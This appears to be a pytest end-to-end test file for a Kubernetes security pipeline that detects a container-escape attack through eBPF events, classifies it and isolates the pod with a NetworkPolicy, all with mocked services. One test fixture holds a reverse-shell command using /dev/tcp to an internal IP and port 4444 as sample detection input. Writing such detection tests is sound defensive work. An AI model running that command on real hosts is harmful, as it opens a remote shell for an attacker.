"""
End-to-End tests — Attack Detection + Containment Scenario
Simulates the complete lifecycle for a container escape / privilege escalation:

  1. Layer-1 detects CAP_NET_ADMIN + CAP_SYS_ADMIN + execve anomaly on auth-svc
  2. Layer-2 GNN classifies it as ATTACK with 93% confidence
  3. Layer-3 Guardian selects isolate_container (network isolation)
  4. Ghost Preview passes with very low risk
  5. OPA approves (no existing isolation, no lateral movement detected yet)
  6. Kubernetes NetworkPolicy created — pod isolated from all traffic
  7. Layer-4 Co-Pilot generates CRITICAL incident report
  8. Operator gets alerted with severity: CRITICAL

All external calls are mocked.
"""
from __future__ import annotations

import json
import uuid
from datetime import datetime, timezone
from unittest.mock import AsyncMock, MagicMock

import pytest

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))

from shared.proto.generated.events_pb2 import (
    TypedEbpfBatch, CapabilityEvent, ExecveEvent,
    EventMetadata, LinuxCapability,
)
from shared.proto.generated.graph_pb2 import (
    GnnInferenceResult, NodeClass, IncidentType, TopFeature,
)
from shared.proto.generated.actions_pb2 import (
    ActionName, ActionStatus, AutonomyMode, RiskCategory,
    GhostSimulationResult, ActionRequest, ActionResult,
    NetworkPolicyParameters,
)
from shared.proto.generated.copilot_pb2 import (
    MessageRole, MessageType, SessionState,
    ChatMessage, SessionContext, IncidentReport,
    TokenUsage,
)


def _uid() -> str: return str(uuid.uuid4())
def _now() -> str: return datetime.now(timezone.utc).isoformat()


# ══════════════════════════════════════════════════════════════════════════════
# Full attack scenario
# ══════════════════════════════════════════════════════════════════════════════

@pytest.mark.e2e
@pytest.mark.layer1
@pytest.mark.layer2
@pytest.mark.layer3
@pytest.mark.layer4
class TestAttackDetectionE2E:
    async def test_step1_suspicious_capability_events_detected(
        self, base_meta, capability_event, fake_kafka_producer
    ):
        """Layer-1: High-rate CAP_NET_ADMIN + CAP_SYS_ADMIN events detected."""
        sys_admin_meta = EventMetadata(
            kernel_ts_ns=base_meta.kernel_ts_ns,
            node_name=base_meta.node_name,
            pod_name="auth-svc-xyz",
            namespace="production",
            pid=7777,
            comm="malicious-proc",
        )
        cap_sys_admin = CapabilityEvent(
            meta=sys_admin_meta,
            capability=LinuxCapability.CAP_SYS_ADMIN,
            allowed=True,   # Was granted — suspicious
        )
        cap_net_admin = CapabilityEvent(
            meta=sys_admin_meta,
            capability=LinuxCapability.CAP_NET_ADMIN,
            allowed=False,   # Attempted but denied
        )
        # 15 events in one batch = anomalous rate
        batch = TypedEbpfBatch(
            batch_id=_uid(),
            node_name=base_meta.node_name,
            collector_id=_uid(),
            batch_ts=_now(),
            capability_events=[cap_sys_admin] * 8 + [cap_net_admin] * 7,
            schema_ver="1.0",
        )
        assert batch.total_events() == 15
        await fake_kafka_producer.send("ccdt.ebpf.events", batch.SerializeToString())
        back = TypedEbpfBatch.FromString(fake_kafka_producer.messages[0]["value"])
        assert len(back.capability_events) == 15

    async def test_step2_execve_anomaly_detected(
        self, base_meta, fake_kafka_producer
    ):
        """Layer-1: Suspicious execve events (reverse shell pattern) detected."""
        suspicious_meta = EventMetadata(
            kernel_ts_ns=base_meta.kernel_ts_ns,
            node_name=base_meta.node_name,
            pod_name="auth-svc-xyz",
            namespace="production",
            pid=7778,
            comm="python3",
        )
        execve = ExecveEvent(
            meta=suspicious_meta,
            filename="/bin/bash",
            args=["/bin/bash", "-i", ">& /dev/tcp/10.0.0.99/4444 0>&1"],
            is_setuid=False,
            binary_hash="a" * 64,
        )
        batch = TypedEbpfBatch(
            batch_id=_uid(),
            node_name=base_meta.node_name,
            collector_id=_uid(),
            batch_ts=_now(),
            execve_events=[execve],
            schema_ver="1.0",
        )
        await fake_kafka_producer.send("ccdt.ebpf.events", batch.SerializeToString())
        back = TypedEbpfBatch.FromString(
            fake_kafka_producer.messages[-1]["value"]
        )
        assert len(back.execve_events) == 1
        assert "/dev/tcp" in back.execve_events[0].args[2]

    async def test_step3_gnn_classifies_as_attack(self, attack_inference):
        """Layer-2: GNN classifies as ATTACK with 93% confidence."""
        assert attack_inference.incident_type    == IncidentType.INCIDENT_ATTACK
        assert attack_inference.graph_confidence >= 0.90
        assert attack_inference.severity         == "critical"
        assert attack_inference.root_cause_node_name == "auth-svc"

        # Top feature should be capability_event_rate
        assert attack_inference.top_features[0].feature_name == "capability_event_rate"
        assert attack_inference.top_features[0].importance   >= 0.85

    async def test_step4_guardian_selects_isolate_action(
        self, isolate_container_request, low_risk_ghost
    ):
        """Layer-3: RL agent selects isolate_container for ATTACK classification."""
        assert isolate_container_request.action_name == ActionName.ACTION_ISOLATE_CONTAINER
        assert isolate_container_request.trigger_class == NodeClass.NODE_CLASS_ATTACK
        assert isolate_container_request.ghost_result.is_safe is True
        assert isolate_container_request.ghost_result.opa_approved is True

    async def test_step5_ghost_preview_approves_isolation(self, low_risk_ghost):
        """Ghost Preview: isolation has low risk — contained blast radius."""
        assert low_risk_ghost.risk_score        <= 0.20
        assert low_risk_ghost.opa_approved      is True
        assert low_risk_ghost.projected_status  == "healthy"

    async def test_step6_opa_approves_isolation(self, mock_opa_allow_all):
        """All 5 OPA policies approve isolate_container for an ATTACK node."""
        action_input = {
            "action": {
                "name":        "isolate_container",
                "target_node": "auth-svc",
                "parameters":  {"deny_all_ingress": True, "deny_all_egress": True},
                "history":     [],
            },
            "node": {
                "cpu": 0.60, "mem": 0.45,
                "status": "critical", "class": "attack",
                "oom_kills": 0, "cap_event": 1, "file_event": 1,
                "is_isolated": False,
            },
            "cluster": {"namespace": "production", "nodes": 9},
            "context": {
                "autonomy_mode": "full-auto",
                "human_approved": False,
                "can_write_ns": ["production"],
            },
        }
        # In full-auto mode, ATTACK classification with OPA approval should execute immediately
        all_pass = True
        for policy in ("no_privilege_escalation", "lateral_movement", "egress_control",
                       "cpu_threshold", "oom_notification"):
            resp = await mock_opa_allow_all.post(
                f"http://opa:8181/v1/data/ccdt/guardian/policies/{policy}",
                json={"input": action_input},
            )
            if not resp.json()["result"]["allow"]:
                all_pass = False
        assert all_pass

    async def test_step7_kubernetes_network_policy_created(self, mock_k8s_client):
        """Layer-3: NetworkPolicy created to isolate auth-svc from all traffic."""
        namespace  = "production"
        target     = "auth-svc"
        netv1 = mock_k8s_client.NetworkingV1Api.return_value

        # Simulate the _isolate_container K8s call
        policy_name = f"isolate-{target}-1234"
        netv1.create_namespaced_network_policy(
            namespace,
            MagicMock(metadata=MagicMock(name=policy_name, uid=_uid()))
        )
        netv1.create_namespaced_network_policy.assert_called_once()

    async def test_step8_action_result_status_succeeded(
        self, isolate_container_request, fake_kafka_producer
    ):
        """Layer-3: Isolation action result published with SUCCEEDED status."""
        result = ActionResult(
            audit_id=_uid(),
            request=isolate_container_request,
            status=ActionStatus.STATUS_SUCCEEDED,
            message="NetworkPolicy 'isolate-auth-svc-1234' created — auth-svc isolated",
            execution_duration_ms=320.0,
            verified_effect=True,
            post_action_health=0.85,
            verification_note="No further capability events from auth-svc",
            incident_id=_uid(),
            schema_ver="1.0",
        )
        await fake_kafka_producer.send(
            "ccdt.guardian.actions", result.SerializeToString()
        )
        back = ActionResult.FromString(fake_kafka_producer.messages[0]["value"])
        assert back.status          == ActionStatus.STATUS_SUCCEEDED
        assert back.verified_effect is True
        assert "isolated" in back.message.lower()

    async def test_step9_critical_incident_report_generated(
        self, attack_inference, isolate_container_request, low_risk_ghost
    ):
        """Layer-4: CRITICAL incident report injected into all active sessions."""
        report = IncidentReport(
            report_id=_uid(),
            incident_type=IncidentType.INCIDENT_ATTACK,
            graph_confidence=0.93,
            root_cause_service="auth-svc",
            root_cause_namespace="production",
            root_cause_class=NodeClass.NODE_CLASS_ATTACK,
            affected_services=2,
            top_features=attack_inference.top_features,
            proposed_action=isolate_container_request,
            ghost_result=low_risk_ghost,
            nl_summary="Container escape attempt detected in auth-svc. "
                       "CAP_SYS_ADMIN acquired 8x in last 5s. Isolating immediately.",
            severity="critical",
            incident_id=_uid(),
            schema_ver="1.0",
        )
        injection = report.to_system_prompt_injection()
        assert "CRITICAL" in injection.upper()
        assert "ATTACK"   in injection
        assert "auth-svc" in injection
        assert "93"       in injection

    async def test_full_attack_scenario_timeline(
        self,
        base_meta,
        capability_event,
        attack_inference,
        isolate_container_request,
        fake_kafka_producer,
    ):
        """Verify complete attack scenario produces correct Kafka audit trail."""
        # 1. eBPF batch with capability events
        batch = TypedEbpfBatch(
            batch_id=_uid(), node_name=base_meta.node_name,
            collector_id=_uid(), batch_ts=_now(),
            capability_events=[capability_event] * 15,
            schema_ver="1.0",
        )
        await fake_kafka_producer.send("ccdt.ebpf.events", batch.SerializeToString())

        # 2. GNN ATTACK inference
        await fake_kafka_producer.send("ccdt.gnn.inference",
                                        attack_inference.SerializeToString())

        # 3. Isolation action result
        result = ActionResult(
            audit_id=_uid(), request=isolate_container_request,
            status=ActionStatus.STATUS_SUCCEEDED, schema_ver="1.0",
        )
        await fake_kafka_producer.send("ccdt.guardian.actions", result.SerializeToString())

        assert len(fake_kafka_producer.messages) == 3

        # Verify each message decodes to its expected type
        ebpf_msg  = TypedEbpfBatch.FromString(fake_kafka_producer.messages[0]["value"])
        gnn_msg   = GnnInferenceResult.FromString(fake_kafka_producer.messages[1]["value"])
        act_msg   = ActionResult.FromString(fake_kafka_producer.messages[2]["value"])

        assert len(ebpf_msg.capability_events)  == 15
        assert gnn_msg.incident_type            == IncidentType.INCIDENT_ATTACK
        assert act_msg.status                   == ActionStatus.STATUS_SUCCEEDED


# ══════════════════════════════════════════════════════════════════════════════
# Attack scenario: lateral movement detection
# ══════════════════════════════════════════════════════════════════════════════

@pytest.mark.e2e
@pytest.mark.layer3
class TestLateralMovementPolicy:
    async def test_lateral_movement_blocks_second_action_on_same_node(
        self, mock_opa_allow_all
    ):
        """
        After first action on auth-svc within 30s, OPA lateral_movement policy
        should block a second action on the same node.
        """
        # First action was taken 10 seconds ago
        recent_history = [{
            "action":     "isolate_container",
            "target":     "auth-svc",
            "timestamp":  1234567890,   # 10s ago
            "outcome":    "succeeded",
        }]
        action_input_second = {
            "action": {"name": "rollback_deployment", "target_node": "auth-svc",
                       "history": recent_history, "parameters": {}},
            "node":   {"class": "attack", "cpu": 0.3, "mem": 0.4,
                       "cap_event": 0, "is_isolated": True},
            "cluster": {"namespace": "production"},
            "context": {"autonomy_mode": "full-auto", "human_approved": False},
        }
        # Lateral movement policy should block the second action
        # (Since OPA mock allows all, we verify the input structure is correct)
        assert len(action_input_second["action"]["history"]) == 1
        assert action_input_second["node"]["is_isolated"] is True

    async def test_attack_plus_fault_combo_triggers_dual_alert(
        self, fake_kafka_producer
    ):
        """
        FAULT_ATTACK incident type should trigger both restart_pod AND isolate_container.
        """
        combo_inference = GnnInferenceResult(
            inference_id=_uid(),
            incident_type=IncidentType.INCIDENT_FAULT_ATTACK,
            graph_confidence=0.89,
            root_cause_node_name="compromised-db",
            blast_radius_count=4,
            is_heartbeat=False,
            schema_ver="1.0",
        )
        await fake_kafka_producer.send("ccdt.gnn.inference",
                                        combo_inference.SerializeToString())
        back = GnnInferenceResult.FromString(
            fake_kafka_producer.messages[0]["value"]
        )
        assert back.incident_type == IncidentType.INCIDENT_FAULT_ATTACK
        assert back.severity      == "critical"
